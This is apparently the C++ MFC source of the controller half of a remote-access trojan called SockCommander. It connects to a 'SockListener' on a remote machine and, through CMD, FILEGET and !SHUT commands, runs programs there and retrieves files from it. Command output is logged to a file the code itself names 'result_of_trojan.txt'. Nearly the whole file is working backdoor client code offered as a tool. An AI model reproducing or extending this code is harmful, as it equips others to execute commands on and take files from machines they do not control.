// SockCommanderDlg.cpp : implementation file
//

#include "stdafx.h"
#include "SockCommander.h"
#include "SockCommanderDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

HGLOBAL gMem;
class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	CString	m_csHelp;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	m_csHelp = _T(
"Commands available for SockCommander(SC) are:\r\n"
"    1.CMD:<your command>\r\n"
"    2.FILEGET:<path of file to retrieve>\r\n"
"    3.!SHUT\r\n"
"Descriptions:\r\n"
"    1. CMD: is used to send a command thats to be executed at\r\n"
"            SockListener (SL)\r\n"
"            e.g CMD:Notepad.Exe will execute notepad at SL\r\n"
"    2. FILEGET: is used to retrieve small files from SL. This\r\n"
"                is still under test stage, not to be used for big files.\r\n"
"                e.g FILEGET:c:\\msdos.sys\r\n"
"    3. !SHUT is used to shutdown SL\r\n"
	);
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Text(pDX, IDC_EDIT2, m_csHelp);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockCommanderDlg dialog

CSockCommanderDlg::CSockCommanderDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSockCommanderDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSockCommanderDlg)
	m_ip = _T("localhost");
	m_msg = _T("Enter Commands Here");
	m_port = _T("777");
	m_csFname = _T("");
	m_csCommanderPort = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSockCommanderDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSockCommanderDlg)
	DDX_Control(pDX, IDC_PROGRESS1, m_progress);
	DDX_Text(pDX, IDC_IP, m_ip);
	DDX_Text(pDX, IDC_MSG, m_msg);
	DDX_Text(pDX, IDC_PORT, m_port);
	DDX_Text(pDX, IDC_FNAME, m_csFname);
	DDX_Text(pDX, IDC_COMMANDER_PORT, m_csCommanderPort);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CSockCommanderDlg, CDialog)
	//{{AFX_MSG_MAP(CSockCommanderDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_CONNECT, OnConnect)
	ON_BN_CLICKED(IDC_SEND, OnSend)
	ON_BN_CLICKED(IDC_DISCONNECT, OnDisconnect)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockCommanderDlg message handlers

BOOL CSockCommanderDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	m_nConnected = FALSE;	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CSockCommanderDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CSockCommanderDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CSockCommanderDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockCommanderDlg::OnConnect
 Description     : 
 Return type     : void 
----------------------------------------------------------------------------------------------------------------
*/
void CSockCommanderDlg::OnConnect() 
{
	int status = FALSE;
	
	UpdateData(TRUE);
	
	if(m_ip.IsEmpty()){
		MessageBeep(MB_ICONQUESTION);
		GetDlgItem(IDC_IP)->SetFocus();
		return;
	}
	
	if(m_port.IsEmpty()){
		MessageBeep(5000);
		GetDlgItem(MB_ICONQUESTION)->SetFocus();
		return;
	}

	m_ptrComSocket = new CCommandSocket(this);
	
	if (!m_ptrComSocket->Create(0,SOCK_STREAM)){
		status = FALSE;
		AfxMessageBox(MSG_SOCKET_CREAT_FAIL);
	}
	else if(!m_ptrComSocket->Connect((LPCTSTR)m_ip, atoi(m_port))) {				
		status = FALSE;
		AfxMessageBox(MSG_SOCKET_CONCT_FAIL);			
	}
	else{
		status = TRUE;
	}
	if(status == FALSE){
		delete m_ptrComSocket;
		m_ptrComSocket = NULL;		
		m_nConnected = FALSE;		
		GetDlgItem(IDC_TEXT)->SetWindowText("Connection to "+m_ip+" failed");
	}
	else{
		m_nConnected = TRUE;
		CString csAddr;
		UINT nPort;

		m_ptrComSocket->GetSockName(csAddr, nPort);

		m_csCommanderPort.Format("%d",nPort);		
		GetDlgItem(IDC_TEXT)->SetWindowText(csAddr + " successfully connected to "+m_ip);		
		UpdateData(FALSE);
	}

}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockCommanderDlg::OnSend
 Description     : 
 Return type     : void 
----------------------------------------------------------------------------------------------------------------
*/
void CSockCommanderDlg::OnSend() 
{
	UpdateData(TRUE);
	if(!m_nConnected) {
		return;
	}
	if(m_msg.IsEmpty()){
		MessageBeep(MB_ICONQUESTION);
		GetDlgItem(IDC_MSG)->SetFocus();
		return;
	}
	if(!m_ptrComSocket->Send((void *)m_msg.GetBuffer(m_msg.GetLength()), m_msg.GetLength())){
		AfxMessageBox(MSG_SOCKET_SEND_FAIL);
	}

	if(m_msg.Find("FILEGET:", 0) != -1) {
		if(!ReceiveFile(m_msg, m_csFname)){
			AfxMessageBox("Receive File Failed");
		}
		else{
			AfxMessageBox("Succesfully received file " + m_csFname);
		}
	}else{
		ReceiveResult(m_msg);
	}
}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockCommanderDlg::OnDisconnect
 Description     : 
 Return type     : void 
----------------------------------------------------------------------------------------------------------------
*/
void CSockCommanderDlg::OnDisconnect() 
{
	if(m_nConnected){
		m_ptrComSocket->Close();
		delete m_ptrComSocket;
		m_nConnected = FALSE;
		GetDlgItem(IDC_TEXT)->SetWindowText("Disconnected from "+m_ip);
	}
}

void CSockCommanderDlg::OnCancel() 
{	
	if(m_nConnected){
		OnDisconnect();
	}

	CDialog::OnCancel();
}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockCommanderDlg::ReceiveFile
 Description     : 
 Return type     : BOOL 
 Argument        : CString csMsg
 Argument        : CString csFileName
----------------------------------------------------------------------------------------------------------------
*/
BOOL CSockCommanderDlg::ReceiveFile(CString csMsg, CString csFileName)
{	
	
	DWORD dwFlen = 0;

	int nBytesRead=m_ptrComSocket->Receive(&dwFlen, 4);

	if(dwFlen == -1) return FALSE;	

	gMem = GlobalAlloc(GHND, dwFlen);
	if(!gMem) {
		AfxMessageBox("Unable to alloc memory");		
		return(FALSE);
	}

	byte* data;
	data = (byte*)GlobalLock(gMem);

	//m_ptrComSocket->Receive(data, dwFlen); 
	nBytesRead=0;

	m_progress.ShowWindow(SW_SHOW);
	m_progress.SetRange(0,dwFlen);

	while (dwFlen != nBytesRead) {
		int dataReadLen = m_ptrComSocket->Receive(data + nBytesRead, dwFlen - nBytesRead);
		nBytesRead += dataReadLen;
		m_progress.SetPos(nBytesRead);
	};//end while
	m_progress.ShowWindow(SW_HIDE);

	CFile cf;
	try{
		if(!cf.Open(csFileName, CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)){
			GlobalUnlock(gMem);
			GlobalFree(gMem);
			return FALSE;
		}
	}
	catch(...){
		return(FALSE);
	}

	cf.Write(data, dwFlen); 
	
	cf.Close();

	GlobalUnlock(gMem);
	GlobalFree(gMem);	
return TRUE;
}

BOOL CSockCommanderDlg::ReceiveResult(CString strCommand)
{
	DWORD dwFlen = 0;

	int nBytesRead=m_ptrComSocket->Receive(&dwFlen, 4);

	if(dwFlen == -1) return FALSE;	

	gMem = GlobalAlloc(GHND, dwFlen);
	if(!gMem) {
		AfxMessageBox("Unable to alloc memory");		
		return(FALSE);
	}

	byte* data;
	data = (byte*)GlobalLock(gMem);

	//m_ptrComSocket->Receive(data, dwFlen); 
	nBytesRead=0;

	m_progress.ShowWindow(SW_SHOW);
	m_progress.SetRange(0,dwFlen);

	while (dwFlen != nBytesRead) {
		int dataReadLen = m_ptrComSocket->Receive(data + nBytesRead, dwFlen - nBytesRead);
		nBytesRead += dataReadLen;
		m_progress.SetPos(nBytesRead);
	};//end while
	m_progress.ShowWindow(SW_HIDE);

	CStdioFile cf;
	try{
		if(!cf.Open("C:\\result_of_trojan.txt", CFile::modeNoTruncate | CFile::modeCreate | CFile::modeWrite)){
			GlobalUnlock(gMem);
			GlobalFree(gMem);
			return FALSE;
		}
	}
	catch(...){
		return(FALSE);
	}

	cf.SeekToEnd();

	cf.WriteString( "************************************************\n" );
	cf.WriteString( "The result of command ");
	cf.WriteString( strCommand.Left( strCommand.Find(':') ) );
	cf.WriteString( " is: \n" );

	cf.Write(data, dwFlen); 
	
	cf.WriteString( "\n" );

	cf.Close();

	GlobalUnlock(gMem);
	GlobalFree(gMem);	

	return TRUE;
}
